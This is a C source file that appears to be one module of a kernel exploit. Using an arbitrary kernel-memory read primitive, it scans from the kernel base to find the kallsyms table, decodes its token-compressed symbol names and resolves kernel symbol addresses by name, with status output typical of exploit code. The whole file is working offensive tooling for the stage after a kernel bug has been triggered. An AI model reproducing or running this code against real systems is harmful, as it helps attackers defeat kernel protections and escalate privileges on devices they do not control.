#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>

#include "kallsyms.h"
#include "kernel_rw.h"
#include "kernel_defs.h"

bool gbKallsymsTblInit = false;
kallsyms_table gKallSymsTbl = {0};

static uint64_t count_increasing_entries(uint64_t pStartAddr)
{
    uint64_t ulIncCount = 0;
    uint64_t ulPrev = 0;
    uint64_t ulNext = 0;

    ulPrev = kernel_read_ulong(pStartAddr);
    ulNext = KERNEL_DS;

    while(ulPrev <= ulNext)
    {
        ulNext = kernel_read_ulong(pStartAddr + (ulIncCount + 1)*sizeof(uint64_t));
        ulIncCount++;
    }

    return ulIncCount;
}

static int32_t load_kallsyms_tbl(void)
{
    int32_t iRet = -1;
    uint64_t pNumSymsAddr = 0;
    uint64_t ulNumSyms = 0;
    uint64_t ulTotalNamesSz = 0;
    uint64_t pTokenTblEnd = 0;
    uint32_t uiNullChars = 0;
    uint64_t ulTokenTblSz = 0;
    uint64_t pTokenIndexData = 0;

    pNumSymsAddr = gKallSymsTbl.pAddrs + sizeof(uint64_t)*gKallSymsTbl.ulNumSyms;
    pNumSymsAddr = pNumSymsAddr + (0x100 - pNumSymsAddr % 0x100);

    ulNumSyms = kernel_read_ulong(pNumSymsAddr);

    if(ulNumSyms != gKallSymsTbl.ulNumSyms)
    {
        printf("[-] found kallsyms table looks incorrect!\n");
        goto done;
    }

    gKallSymsTbl.pNames = pNumSymsAddr + 0x100;

    for(int32_t i = 0; i < ulNumSyms; i++)
    {
        ulTotalNamesSz += kernel_read_uchar(gKallSymsTbl.pNames + ulTotalNamesSz) + 1;
    }

    gKallSymsTbl.pMarkers = gKallSymsTbl.pNames + ulTotalNamesSz + (0x100 - ulTotalNamesSz % 0x100);
    gKallSymsTbl.pTokenTbl = gKallSymsTbl.pMarkers + ((ulNumSyms + (0x100 - ulNumSyms %0x100))/(0x100))*sizeof(uint64_t);
    gKallSymsTbl.pTokenTbl = gKallSymsTbl.pTokenTbl + (0x100 - gKallSymsTbl.pTokenTbl % 0x100);

    pTokenTblEnd = gKallSymsTbl.pTokenTbl;

    while(uiNullChars < KALLSYMS_NUM_TOKENS)
    {
        if(0x0 == kernel_read_uchar(pTokenTblEnd))
        {
            uiNullChars++;
        }

        pTokenTblEnd++;
    }

    ulTokenTblSz = pTokenTblEnd - gKallSymsTbl.pTokenTbl;
    gKallSymsTbl.pszTokenTblData = (char*)malloc(ulTokenTblSz);

    if(NULL == gKallSymsTbl.pszTokenTblData)
    {
        printf("[-] failed to allocate memory!\n");
        goto done;
    }

    for(int32_t i = 0; i < ulTokenTblSz; i++)
    {
        gKallSymsTbl.pszTokenTblData[i] = kernel_read_uchar(gKallSymsTbl.pTokenTbl + i);
    }

    pTokenIndexData = pTokenTblEnd + (0x100 - pTokenTblEnd % 0x100);

    if(KALLSYMS_NUM_TOKENS*sizeof(uint16_t) != kernel_read(pTokenIndexData, gKallSymsTbl.usTokenIndexData, sizeof(gKallSymsTbl.usTokenIndexData)))
    {
        printf("[-] failed to read token index data from the kallsyms table!\n");
        goto done;
    }

    gbKallsymsTblInit = true;
    iRet = 0;

done:
    return iRet;
}

static int32_t init_kallsyms_tbl(void)
{
    int32_t iRet = -1;
    uint8_t szDataBuff[PAGE_SIZE] = {0};
    uint64_t ulIncCount = 0;

    for(int32_t i = 0; i < KALLSYMS_MAX_SEARCH; i+=PAGE_SIZE)
    {
        if(PAGE_SIZE == kernel_read(KERNEL_BASE + i, szDataBuff, PAGE_SIZE))
        {
            for(int32_t j = 0; j < PAGE_SIZE; j+=0x100)
            {
                if(IS_KERNEL_POINTER(*(uint64_t*)(szDataBuff+j)))
                {
                    ulIncCount = count_increasing_entries(KERNEL_BASE + i + j);

                    if(KALLSYMS_INC_COUNT <= ulIncCount)
                    {
                        gKallSymsTbl.pAddrs = KERNEL_BASE + i + j;
                        gKallSymsTbl.ulNumSyms = ulIncCount;
                        iRet = load_kallsyms_tbl();
                        goto done;
                    }
                }
            }
        }
    }

done:
    return iRet;
}

static int32_t get_kallsym_name(uint64_t pNameAddr,char* pszNameBuff)
{
    int32_t uiLength = 0;
    uint64_t pNameIndex = 0;
    char* pszNameOffset = 0;
    uint32_t uiDataIndex = 0;
    uint32_t uiTokenIndex = 0;
    uint32_t uiFragSz = 0;

    uiLength = kernel_read_uchar(pNameAddr);
    pNameIndex = pNameAddr + 1;
    pszNameOffset = pszNameBuff;

    for(int32_t i = 0; i < uiLength; i++)
    {
        uiDataIndex = kernel_read_uchar(pNameIndex);
        uiTokenIndex = gKallSymsTbl.usTokenIndexData[uiDataIndex];
        uiFragSz = strlen(gKallSymsTbl.pszTokenTblData + uiTokenIndex);
        memcpy(pszNameOffset, gKallSymsTbl.pszTokenTblData + uiTokenIndex, uiFragSz);
        pszNameOffset += uiFragSz;
        pNameIndex++;
    }

    *pszNameOffset = 0x0;

    return uiLength + 1;
}

uint64_t get_kernel_sym_addr(char* pszSymName)
{
    uint64_t pKSymAddr = 0;
    uint32_t uiMarker = 0;
    char szNameBuff[KALLSYMS_MAX_NAME_LEN] = {0};

    if(!gbKallsymsTblInit)
    {
        if(0 != init_kallsyms_tbl())
        {
            printf("[-] failed to initialze kallsyms table!\n");
            goto done;
        }

        printf("[+] found kallsyms table!\n");
    }

    for(int32_t i = 0; i < gKallSymsTbl.ulNumSyms; i++)
    {
        uiMarker += get_kallsym_name(gKallSymsTbl.pNames + uiMarker, szNameBuff);

        if(0 == strcmp(szNameBuff + 1, pszSymName))
        {
            pKSymAddr = kernel_read_ulong(gKallSymsTbl.pAddrs + i*sizeof(uint64_t));
            break;
        }
    }
    
done:

    return pKSymAddr;
}

void cleanup_kallsyms_tbl(void)
{
    if(gbKallsymsTblInit)
    {
        free(gKallSymsTbl.pszTokenTblData);
        gKallSymsTbl.pszTokenTblData = NULL;
        gbKallsymsTblInit = false;
    }
}